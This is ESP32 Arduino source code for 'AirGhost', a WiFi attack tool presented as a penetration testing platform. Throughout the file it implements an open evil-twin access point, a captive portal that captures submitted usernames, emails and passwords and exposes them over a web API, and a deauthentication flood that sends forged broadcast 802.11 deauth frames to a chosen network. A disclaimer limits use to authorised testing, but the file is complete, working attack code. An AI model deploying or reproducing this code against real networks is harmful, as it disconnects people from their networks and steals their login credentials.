/*
 * AirGhost ESP32 - WiFi Penetration Testing Platform for ESP32
 * 
 * This code allows an ESP32 to perform WiFi penetration testing
 * functions similar to the AirGhost platform.
 * 
 * Features:
 * - Evil Twin AP creation
 * - Captive portal for credential harvesting
 * - WiFi scanning and network detection
 * - Deauthentication attacks
 * - Web interface for control
 * 
 * WARNING: This tool is intended for legitimate security testing only.
 * Always obtain proper authorization before testing any network.
 * Unauthorized network penetration testing is illegal and unethical.
 * 
 * Dependencies:
 * - ESP32 Arduino Core
 * - ESPAsyncWebServer
 * - AsyncTCP
 * - ArduinoJson
 * - ESP32 WiFi libraries
 */

#include <WiFi.h>
#include <WiFiClient.h>
#include <WiFiAP.h>
#include <DNSServer.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <ArduinoJson.h>
#include <SPIFFS.h>
#include <esp_wifi.h>

// Constants
#define MAX_NETWORKS 20
#define MAX_CLIENTS 10
#define DNS_PORT 53
#define WEB_PORT 80
#define MAX_SSID_LENGTH 32
#define MAX_DEAUTH_PACKETS 100

// Attack modes
enum AttackMode {
  ATTACK_NONE,
  ATTACK_SCAN,
  ATTACK_EVIL_TWIN,
  ATTACK_CAPTIVE_PORTAL,
  ATTACK_DEAUTH
};

// Global variables
AttackMode currentAttack = ATTACK_NONE;
AsyncWebServer webServer(WEB_PORT);
DNSServer dnsServer;
String apSSID = "Free-WiFi";
String apPassword = "";  // Open network by default
IPAddress apIP(192, 168, 4, 1);
IPAddress netMask(255, 255, 255, 0);

// For scanning
int networkCount = 0;
String networkSSIDs[MAX_NETWORKS];
uint8_t networkBSSIDs[MAX_NETWORKS][6];
int networkRSSI[MAX_NETWORKS];
uint8_t networkChannels[MAX_NETWORKS];
uint8_t networkEncryption[MAX_NETWORKS];

// For deauth attack
uint8_t targetBSSID[6];
uint8_t targetChannel = 1;
bool deauthRunning = false;

// For captive portal
String capturedCredentials = "";
int credentialsCount = 0;

// Management frame structure for deauth packets
struct DeauthPacket {
  uint8_t type;
  uint8_t subtype;
  uint8_t flags;
  uint16_t duration;
  uint8_t receiver[6];
  uint8_t transmitter[6];
  uint8_t bssid[6];
  uint16_t sequenceControl;
  uint16_t reasonCode;
};

// Function prototypes
void setupAP(String ssid, String password);
void startCaptivePortal();
void startDeauth(uint8_t* bssid, uint8_t channel);
void stopCurrentAttack();
void scanNetworks();
void sendDeauthPacket(uint8_t* target, uint8_t* ap);
String macToString(uint8_t* mac);
void stringToMac(String macStr, uint8_t* mac);
void setupWebServer();
void handleRoot(AsyncWebServerRequest *request);
void handleScan(AsyncWebServerRequest *request);
void handleStartAttack(AsyncWebServerRequest *request);
void handleStopAttack(AsyncWebServerRequest *request);
void handleNotFound(AsyncWebServerRequest *request);
void handleCredentials(AsyncWebServerRequest *request);
void handleStatus(AsyncWebServerRequest *request);
void setupSPIFFS();

void setup() {
  // Initialize serial communication
  Serial.begin(115200);
  Serial.println("AirGhost ESP32 starting...");
  
  // Initialize SPIFFS for web files
  setupSPIFFS();
  
  // Initialize WiFi
  WiFi.mode(WIFI_MODE_APSTA);
  WiFi.disconnect();
  delay(100);
  
  // Set up the web server
  setupWebServer();
  
  Serial.println("AirGhost ESP32 ready!");
  Serial.println("Access the web interface at http://192.168.4.1");
  
  // Start AP by default
  setupAP(apSSID, apPassword);
}

void loop() {
  // Handle DNS requests for captive portal
  if (currentAttack == ATTACK_CAPTIVE_PORTAL) {
    dnsServer.processNextRequest();
  }
  
  // Handle deauth attack
  if (currentAttack == ATTACK_DEAUTH && deauthRunning) {
    for (int i = 0; i < 10; i++) {  // Send multiple deauth packets
      sendDeauthPacket(NULL, targetBSSID);  // Broadcast deauth
      delay(10);
    }
  }
  
  // Other periodic tasks
  delay(10);
}

// Initialize SPIFFS for web files
void setupSPIFFS() {
  if (!SPIFFS.begin(true)) {
    Serial.println("An error occurred while mounting SPIFFS");
    return;
  }
  Serial.println("SPIFFS mounted successfully");
}

// Set up the access point
void setupAP(String ssid, String password) {
  WiFi.softAPdisconnect(true);
  delay(100);
  
  WiFi.softAPConfig(apIP, apIP, netMask);
  
  if (password.length() > 0) {
    WiFi.softAP(ssid.c_str(), password.c_str());
    Serial.println("AP created with password: " + password);
  } else {
    WiFi.softAP(ssid.c_str());
    Serial.println("Open AP created");
  }
  
  Serial.print("AP IP address: ");
  Serial.println(WiFi.softAPIP());
}

// Start captive portal attack
void startCaptivePortal() {
  currentAttack = ATTACK_CAPTIVE_PORTAL;
  
  // Start DNS server for captive portal
  dnsServer.start(DNS_PORT, "*", apIP);
  
  Serial.println("Captive portal started");
}

// Start deauthentication attack
void startDeauth(uint8_t* bssid, uint8_t channel) {
  currentAttack = ATTACK_DEAUTH;
  
  // Copy target BSSID
  memcpy(targetBSSID, bssid, 6);
  targetChannel = channel;
  
  // Set WiFi channel
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  
  deauthRunning = true;
  Serial.print("Deauth attack started on ");
  Serial.print(macToString(bssid));
  Serial.print(" (Channel ");
  Serial.print(channel);
  Serial.println(")");
}

// Stop the current attack
void stopCurrentAttack() {
  switch (currentAttack) {
    case ATTACK_CAPTIVE_PORTAL:
      dnsServer.stop();
      break;
    case ATTACK_DEAUTH:
      deauthRunning = false;
      break;
    default:
      break;
  }
  
  currentAttack = ATTACK_NONE;
  Serial.println("Attack stopped");
}

// Scan for WiFi networks
void scanNetworks() {
  currentAttack = ATTACK_SCAN;
  
  Serial.println("Scanning for networks...");
  
  // Set WiFi to station mode for scanning
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  
  networkCount = WiFi.scanNetworks();
  Serial.print("Found ");
  Serial.print(networkCount);
  Serial.println(" networks");
  
  // Store network information
  for (int i = 0; i < networkCount && i < MAX_NETWORKS; i++) {
    networkSSIDs[i] = WiFi.SSID(i);
    memcpy(networkBSSIDs[i], WiFi.BSSID(i), 6);
    networkRSSI[i] = WiFi.RSSI(i);
    networkChannels[i] = WiFi.channel(i);
    networkEncryption[i] = WiFi.encryptionType(i);
    
    Serial.print(i + 1);
    Serial.print(": ");
    Serial.print(networkSSIDs[i]);
    Serial.print(" (");
    Serial.print(macToString(networkBSSIDs[i]));
    Serial.print(") Ch:");
    Serial.print(networkChannels[i]);
    Serial.print(" RSSI:");
    Serial.println(networkRSSI[i]);
  }
  
  // Return to AP+STA mode
  WiFi.mode(WIFI_MODE_APSTA);
  
  currentAttack = ATTACK_NONE;
}

// Send a deauthentication packet
void sendDeauthPacket(uint8_t* target, uint8_t* ap) {
  // Create a deauth packet
  uint8_t deauthPacket[26] = {
    0xC0, 0x00,                         // Type/Subtype: deauth
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source: AP MAC
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID: AP MAC
    0x00, 0x00,                         // Sequence number (will be replaced by the SDK)
    0x01, 0x00                          // Reason code: 1 = Unspecified
  };
  
  // Set AP MAC address
  memcpy(&deauthPacket[10], ap, 6);
  memcpy(&deauthPacket[16], ap, 6);
  
  // If target is NULL, broadcast deauth to all clients
  if (target == NULL) {
    // Send packet
    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
  } else {
    // Set target MAC address
    memcpy(&deauthPacket[4], target, 6);
    
    // Send packet
    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
  }
}

// Convert MAC address to string
String macToString(uint8_t* mac) {
  char macStr[18] = {0};
  sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(macStr);
}

// Convert string to MAC address
void stringToMac(String macStr, uint8_t* mac) {
  int values[6];
  int i;
  
  if (sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x", &values[0], &values[1], &values[2], &values[3], &values[4], &values[5]) == 6) {
    for (i = 0; i < 6; ++i) {
      mac[i] = (uint8_t) values[i];
    }
  }
}

// Set up the web server
void setupWebServer() {
  // Serve static files from SPIFFS
  webServer.serveStatic("/", SPIFFS, "/").setDefaultFile("index.html");
  
  // API endpoints
  webServer.on("/api/scan", HTTP_GET, handleScan);
  webServer.on("/api/attack/start", HTTP_POST, handleStartAttack);
  webServer.on("/api/attack/stop", HTTP_POST, handleStopAttack);
  webServer.on("/api/credentials", HTTP_GET, handleCredentials);
  webServer.on("/api/status", HTTP_GET, handleStatus);
  
  // Captive portal endpoints
  webServer.on("/captive", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->redirect("/");
  });
  
  webServer.on("/captive/login", HTTP_POST, [](AsyncWebServerRequest *request) {
    String username = "";
    String password = "";
    
    int params = request->params();
    for (int i = 0; i < params; i++) {
      AsyncWebParameter* p = request->getParam(i);
      if (p->name() == "username" || p->name() == "email") {
        username = p->value();
      } else if (p->name() == "password") {
        password = p->value();
      }
    }
    
    if (username != "" && password != "") {
      String creds = "Username/Email: " + username + ", Password: " + password;
      capturedCredentials += creds + "\n";
      credentialsCount++;
      
      Serial.println("Credentials captured: " + creds);
    }
    
    // Redirect to success page
    request->redirect("/success.html");
  });
  
  // Handle not found (for captive portal)
  webServer.onNotFound(handleNotFound);
  
  // Start server
  webServer.begin();
  Serial.println("Web server started");
}

// Handle root request
void handleRoot(AsyncWebServerRequest *request) {
  request->send(SPIFFS, "/index.html", "text/html");
}

// Handle network scan request
void handleScan(AsyncWebServerRequest *request) {
  scanNetworks();
  
  // Create JSON response
  DynamicJsonDocument doc(4096);
  JsonArray networks = doc.createNestedArray("networks");
  
  for (int i = 0; i < networkCount && i < MAX_NETWORKS; i++) {
    JsonObject network = networks.createNestedObject();
    network["ssid"] = networkSSIDs[i];
    network["bssid"] = macToString(networkBSSIDs[i]);
    network["rssi"] = networkRSSI[i];
    network["channel"] = networkChannels[i];
    network["encryption"] = networkEncryption[i];
  }
  
  String response;
  serializeJson(doc, response);
  request->send(200, "application/json", response);
}

// Handle start attack request
void handleStartAttack(AsyncWebServerRequest *request) {
  bool success = false;
  String message = "Invalid attack parameters";
  
  // Check for POST parameters
  if (request->hasParam("type", true)) {
    String attackType = request->getParam("type", true)->value();
    
    // Stop any current attack first
    stopCurrentAttack();
    
    if (attackType == "evil_twin") {
      if (request->hasParam("ssid", true)) {
        String ssid = request->getParam("ssid", true)->value();
        String password = "";
        
        if (request->hasParam("password", true)) {
          password = request->getParam("password", true)->value();
        }
        
        apSSID = ssid;
        apPassword = password;
        setupAP(ssid, password);
        success = true;
        message = "Evil Twin AP started with SSID: " + ssid;
      }
    } else if (attackType == "captive_portal") {
      startCaptivePortal();
      success = true;
      message = "Captive portal started";
    } else if (attackType == "deauth") {
      if (request->hasParam("bssid", true) && request->hasParam("channel", true)) {
        String bssidStr = request->getParam("bssid", true)->value();
        int channel = request->getParam("channel", true)->value().toInt();
        
        uint8_t bssid[6];
        stringToMac(bssidStr, bssid);
        
        startDeauth(bssid, channel);
        success = true;
        message = "Deauth attack started on " + bssidStr;
      }
    }
  }
  
  // Create JSON response
  DynamicJsonDocument doc(256);
  doc["success"] = success;
  doc["message"] = message;
  
  String response;
  serializeJson(doc, response);
  request->send(200, "application/json", response);
}

// Handle stop attack request
void handleStopAttack(AsyncWebServerRequest *request) {
  stopCurrentAttack();
  
  // Create JSON response
  DynamicJsonDocument doc(256);
  doc["success"] = true;
  doc["message"] = "Attack stopped";
  
  String response;
  serializeJson(doc, response);
  request->send(200, "application/json", response);
}

// Handle credentials request
void handleCredentials(AsyncWebServerRequest *request) {
  // Create JSON response
  DynamicJsonDocument doc(4096);
  doc["count"] = credentialsCount;
  doc["credentials"] = capturedCredentials;
  
  String response;
  serializeJson(doc, response);
  request->send(200, "application/json", response);
}

// Handle status request
void handleStatus(AsyncWebServerRequest *request) {
  // Create JSON response
  DynamicJsonDocument doc(1024);
  doc["attack"] = currentAttack;
  doc["ap_ssid"] = apSSID;
  doc["ap_clients"] = WiFi.softAPgetStationNum();
  
  if (currentAttack == ATTACK_DEAUTH) {
    doc["deauth_target"] = macToString(targetBSSID);
    doc["deauth_channel"] = targetChannel;
    doc["deauth_running"] = deauthRunning;
  }
  
  if (currentAttack == ATTACK_CAPTIVE_PORTAL) {
    doc["credentials_count"] = credentialsCount;
  }
  
  String response;
  serializeJson(doc, response);
  request->send(200, "application/json", response);
}

// Handle not found (redirect to captive portal)
void handleNotFound(AsyncWebServerRequest *request) {
  if (currentAttack == ATTACK_CAPTIVE_PORTAL) {
    // If it's a captive portal request, redirect to the root
    request->redirect("/");
  } else {
    // Otherwise return 404
    request->send(404, "text/plain", "Not found");
  }
}
